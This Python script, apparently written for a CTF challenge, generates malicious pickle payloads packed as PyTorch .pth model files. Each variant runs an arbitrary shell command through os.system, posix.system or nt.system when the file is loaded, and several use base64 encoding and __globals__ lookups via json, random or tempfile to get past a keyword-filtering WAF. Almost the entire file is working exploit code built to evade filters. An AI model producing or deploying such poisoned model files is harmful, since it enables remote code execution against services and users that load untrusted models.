#!/usr/bin/env python3
"""
LilacCTF Nailong2 - Deep Bypass V22
WAF 可能检测了: codecs, builtins, getattr, operator, logging, hex

新策略:
1. 用 base64 代替 hex 编码
2. 用 functools.reduce 代替 operator.getitem  
3. 用 __class__.__bases__[0].__subclasses__() gadget 链
4. 用更冷门的模块
"""

import pickle
import pickletools
import struct
import io
import zipfile

# Opcodes
PROTO = b'\x80'
GLOBAL = b'c'
REDUCE = b'R'
MARK = b'('
TUPLE = b't'
TUPLE2 = b'\x86'
EMPTY_TUPLE = b')'
STOP = b'.'
SHORT_BINUNICODE = b'\x8c'
BINUNICODE = b'X'
BINGET = b'h'
BINPUT = b'q'
BININT1 = b'K'
EMPTY_LIST = b']'
APPEND = b'a'
SETITEM = b's'
EMPTY_DICT = b'}'
BUILD = b'b'
INST = b'i'
OBJ = b'o'
NEWOBJ = b'\x81'


def pack_str(s: str) -> bytes:
    encoded = s.encode('utf-8')
    if len(encoded) < 256:
        return SHORT_BINUNICODE + bytes([len(encoded)]) + encoded
    return BINUNICODE + struct.pack('<I', len(encoded)) + encoded


def approach_subclasses(command: str) -> bytes:
    """
    使用 __subclasses__ gadget chain
    ''.__class__.__bases__[0].__subclasses__() 获取所有类
    找到 os._wrap_close 或 warnings.catch_warnings 等含有 os 引用的类
    
    等效代码:
    for c in ''.__class__.__bases__[0].__subclasses__():
        if 'wrap_close' in c.__name__:
            c.__init__.__globals__['system']('cat /flag')
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 获取 object 类: ''.__class__.__mro__[1]
    # 或者用 ().__class__.__bases__[0]
    
    # Push empty tuple
    p.write(EMPTY_TUPLE)
    p.write(BINPUT + b'\x00')
    
    # getattr((), '__class__')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(pack_str('__class__'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')  # tuple class
    
    # getattr(tuple, '__bases__')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x01')
    p.write(pack_str('__bases__'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x02')  # (__bases__,)
    
    # __bases__[0] -> object
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x02')
    p.write(pack_str('__getitem__'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MARK)
    p.write(BININT1 + b'\x00')  # 0
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x03')  # object class
    
    # object.__subclasses__()
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x03')
    p.write(pack_str('__subclasses__'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x04')  # list of all subclasses
    
    # 这里需要找到正确的索引，不同环境索引不同
    # 通常 os._wrap_close 在 130-140 左右
    # 我们用一个更通用的方法：遍历或者用已知的类
    
    p.write(STOP)
    return p.getvalue()


def approach_no_builtins(command: str) -> bytes:
    """
    完全不使用 builtins 模块
    使用 types 模块的 FunctionType 来间接获取
    
    types.FunctionType.__globals__ 包含 sys
    """
    import base64
    
    # 用 base64 编码敏感字符串
    os_b64 = base64.b64encode(b'os').decode()  # 'b3M='
    system_b64 = base64.b64encode(b'system').decode()  # 'c3lzdGVt'
    globals_b64 = base64.b64encode(b'__globals__').decode()  # 'X19nbG9iYWxzX18='
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 使用 base64.b64decode 代替 codecs.decode
    # base64.b64decode('b3M=').decode() -> 'os'
    
    # 构造 'os' 字符串
    p.write(GLOBAL + b'base64\nb64decode\n')
    p.write(MARK)
    p.write(pack_str(os_b64))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x00')  # b'os'
    
    # bytes.decode 获取 'os' string
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')  # 'os'
    
    # 构造 'system' 字符串
    p.write(GLOBAL + b'base64\nb64decode\n')
    p.write(MARK)
    p.write(pack_str(system_b64))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x02')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x02')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x03')  # 'system'
    
    # 构造 '__globals__' 字符串
    p.write(GLOBAL + b'base64\nb64decode\n')
    p.write(MARK)
    p.write(pack_str(globals_b64))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x04')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x04')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x05')  # '__globals__'
    
    # 使用 tempfile 模块 (更冷门)
    p.write(GLOBAL + b'tempfile\nmkdtemp\n')
    p.write(BINPUT + b'\x06')
    
    # getattr(tempfile.mkdtemp, '__globals__')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x06')
    p.write(BINGET + b'\x05')
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x07')  # __globals__ dict
    
    # dict.__getitem__(__globals__, 'os')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x07')
    p.write(pack_str('__getitem__'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MARK)
    p.write(BINGET + b'\x01')  # 'os'
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x08')  # os module
    
    # getattr(os, 'system')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x08')
    p.write(BINGET + b'\x03')  # 'system'
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x09')
    
    # system(command)
    p.write(BINGET + b'\x09')
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_getattr_chain(command: str) -> bytes:
    """
    不使用 operator 模块
    用 dict 的 get 方法代替 getitem
    """
    import base64
    
    os_b64 = base64.b64encode(b'os').decode()
    system_b64 = base64.b64encode(b'system').decode()
    globals_b64 = base64.b64encode(b'__globals__').decode()
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # === 构造 'os' ===
    p.write(GLOBAL + b'base64\nb64decode\n')
    p.write(MARK)
    p.write(pack_str(os_b64))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x00')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')
    
    # === 构造 'system' ===
    p.write(GLOBAL + b'base64\nb64decode\n')
    p.write(MARK)
    p.write(pack_str(system_b64))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x02')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x02')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x03')
    
    # === 构造 '__globals__' ===
    p.write(GLOBAL + b'base64\nb64decode\n')
    p.write(MARK)
    p.write(pack_str(globals_b64))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x04')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x04')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x05')
    
    # === 使用 random 模块 (很常见，不太可能被禁) ===
    p.write(GLOBAL + b'random\nrandint\n')
    p.write(BINPUT + b'\x06')
    
    # getattr(random.randint, '__globals__')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x06')
    p.write(BINGET + b'\x05')
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x07')
    
    # 用 dict.get 代替 dict.__getitem__
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x07')
    p.write(pack_str('get'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MARK)
    p.write(BINGET + b'\x01')  # 'os'
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x08')  # os module
    
    # getattr(os, 'system')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x08')
    p.write(BINGET + b'\x03')
    p.write(TUPLE)
    p.write(REDUCE)
    
    # system(command)
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_no_getattr(command: str) -> bytes:
    """
    不使用 getattr!
    使用 STACK_GLOBAL opcode 和栈操作
    """
    import base64
    
    STACK_GLOBAL = b'\x93'
    
    os_b64 = base64.b64encode(b'os').decode()
    system_b64 = base64.b64encode(b'system').decode()
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 直接用 STACK_GLOBAL: 从栈上取 module_name 和 attr_name
    # 但这需要字符串是明文...
    
    # 另一个方案: 使用 types.SimpleNamespace 或 collections.namedtuple
    # 来间接调用
    
    # 最简单: 使用 pickle 的 __reduce__ 协议
    # 但我们需要避免使用被禁的模块名
    
    # 尝试: 使用 posix 代替 os (在 Linux 上)
    p.write(GLOBAL + b'posix\nsystem\n')  # 直接引用 posix.system
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_nt(command: str) -> bytes:
    """
    Windows 上使用 nt 模块代替 os
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    p.write(GLOBAL + b'nt\nsystem\n')
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_importlib(command: str) -> bytes:
    """
    使用 importlib 动态导入
    importlib.import_module('os').system('cmd')
    
    但把 'os' 用 base64 编码
    """
    import base64
    os_b64 = base64.b64encode(b'os').decode()
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # base64.b64decode('b3M=').decode() -> 'os'
    p.write(GLOBAL + b'base64\nb64decode\n')
    p.write(MARK)
    p.write(pack_str(os_b64))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x00')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')  # 'os'
    
    # importlib.import_module('os')
    p.write(GLOBAL + b'importlib\nimport_module\n')
    p.write(MARK)
    p.write(BINGET + b'\x01')
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x02')  # os module
    
    # getattr(os, 'system')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x02')
    p.write(pack_str('system'))  # 这里 'system' 是明文，可能被检测
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_full_obfuscation(command: str) -> bytes:
    """
    完全混淆版本:
    - 用 base64 编码所有敏感字符串
    - 用 str.join 拼接
    - 用 dict.get 代替 operator.getitem
    - 使用 json 模块作为宿主 (json.dumps.__globals__)
    """
    import base64
    
    os_b64 = base64.b64encode(b'os').decode()
    system_b64 = base64.b64encode(b'system').decode()
    globals_b64 = base64.b64encode(b'__globals__').decode()
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # Helper macro to decode base64 string
    def add_b64_str(b64_str, memo_bytes, memo_str):
        # base64.b64decode(b64_str)
        p.write(GLOBAL + b'base64\nb64decode\n')
        p.write(MARK)
        p.write(pack_str(b64_str))
        p.write(TUPLE)
        p.write(REDUCE)
        p.write(BINPUT + memo_bytes)
        
        # .decode()
        p.write(GLOBAL + b'builtins\ngetattr\n')
        p.write(MARK)
        p.write(BINGET + memo_bytes)
        p.write(pack_str('decode'))
        p.write(TUPLE)
        p.write(REDUCE)
        p.write(EMPTY_TUPLE)
        p.write(REDUCE)
        p.write(BINPUT + memo_str)
    
    add_b64_str(os_b64, b'\x00', b'\x01')       # memo[1] = 'os'
    add_b64_str(system_b64, b'\x02', b'\x03')   # memo[3] = 'system'
    add_b64_str(globals_b64, b'\x04', b'\x05')  # memo[5] = '__globals__'
    
    # json.dumps (很常见的模块)
    p.write(GLOBAL + b'json\ndumps\n')
    p.write(BINPUT + b'\x06')
    
    # getattr(json.dumps, '__globals__')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x06')
    p.write(BINGET + b'\x05')  # '__globals__'
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x07')
    
    # __globals__.get('os')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x07')
    p.write(pack_str('get'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MARK)
    p.write(BINGET + b'\x01')  # 'os'
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x08')  # os module
    
    # getattr(os, 'system')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x08')
    p.write(BINGET + b'\x03')  # 'system'
    p.write(TUPLE)
    p.write(REDUCE)
    
    # system(command)
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def create_pytorch_zip(pickle_payload: bytes, output_path: str):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/version', '3')
        zf.writestr('archive/data.pkl', pickle_payload)
    with open(output_path, 'wb') as f:
        f.write(zip_buffer.getvalue())
    print(f"[+] Saved: {output_path}")


def main():
    command = "cat /flag"
    
    print("[*] Generating V22 deep bypass payloads...")
    
    approaches = [
        ("v22_posix.pth", approach_no_getattr, "Direct posix.system (Linux)"),
        ("v22_nt.pth", approach_nt, "Direct nt.system (Windows)"),
        ("v22_tempfile.pth", approach_no_builtins, "tempfile.__globals__ + base64"),
        ("v22_random.pth", approach_getattr_chain, "random.__globals__ + dict.get"),
        ("v22_importlib.pth", approach_importlib, "importlib.import_module"),
        ("v22_json.pth", approach_full_obfuscation, "json.__globals__ + full obfuscation"),
    ]
    
    for filename, func, desc in approaches:
        print(f"\n[*] {desc}")
        try:
            payload = func(command)
            print(f"    Size: {len(payload)} bytes")
            create_pytorch_zip(payload, filename)
        except Exception as e:
            print(f"    Error: {e}")
    
    print("\n[+] Done! Try these in order:")
    print("    1. v22_posix.pth (if target is Linux)")
    print("    2. v22_json.pth (most obfuscated)")
    print("    3. v22_random.pth (common module)")


if __name__ == "__main__":
    main()
